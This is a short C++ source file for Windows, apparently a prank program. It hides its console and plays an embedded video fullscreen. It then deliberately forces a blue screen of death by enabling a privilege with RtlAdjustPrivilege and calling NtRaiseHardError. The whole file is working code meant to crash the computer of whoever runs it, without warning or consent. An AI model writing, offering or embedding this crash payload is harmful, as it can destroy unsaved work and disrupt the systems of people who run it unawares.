#include <windows.h>
#include <dshow.h>

// externs for bsod stuff
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

// global variables for DirectShow
IGraphBuilder*	graph = 0; 		// filter graph manager
IMediaControl*	control = 0; 	// media control interface
IMediaEvent*	event = 0; 		// media event interface
IVideoWindow*	window = 0;		// the video window

// helper functions
void GetVideoResource(LPWSTR* path) {
	// get the video resource data
	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
	HGLOBAL handle = LoadResource(NULL, resource);

	DWORD size = SizeofResource(NULL, resource);
	LPVOID data = LockResource(handle);

	// close the resource handle
	CloseHandle(handle);

	// get the temporary path and append the video name
	GetTempPathW(MAX_PATH, *path);	
	StringCbCatW(*path, MAX_PATH, L"video.wmv");

	// create the file handle and the variable for number of written bytes
	HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD written = 0;

	// write the video data to the temporary path
	WriteFile(file, data, size, &written, NULL);
	CloseHandle(file);

	// free the resource
	FreeResource(resource);
}

void InitializeDirectShow(LPCWSTR* path) {
	// initialize the COM
	CoInitialize(NULL);

	// create the filter graph manager
	CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);

	// get all needed addition interfaces
	graph->QueryInterface(IID_IMediaControl, (void**)&control);
	graph->QueryInterface(IID_IMediaEvent, (void**)&event);
	graph->QueryInterface(IID_IVideoWindow, (void**)&window);

	// attempt to build the graph for file playback
	graph->RenderFile(*path, NULL);

	// set the video window to fullscreen mode
	window->put_FullScreenMode(OATRUE);
}

ULONG TriggerBSOD() {
	BOOLEAN state;
	ULONG response;

	RtlAdjustPrivilege(19, TRUE, FALSE, &state); // adjust privileges to allow raising BSoD
	NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response); // raise BSoD

	return response;
}

// main function
int main() {
	LPWSTR path = new WCHAR[MAX_PATH];
	//WCHAR* path = L"C:\\Users\\bemxio\\AppData\\Local\\Temp\\video.wmv";

	HRESULT result;
	LONG code;
	
	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window

	GetVideoResource(&path); // get the video resource
	InitializeDirectShow((LPCWSTR*)&path); // initialize directshow stuff

	result = control->Run(); // play the video

	if (SUCCEEDED(result)) {
		event->WaitForCompletion(INFINITE, &code); // wait for video to finish
	}

	// trigger the blue screen of death
	TriggerBSOD();

	// if it gets here, the BSoD failed :(
	return 1;
}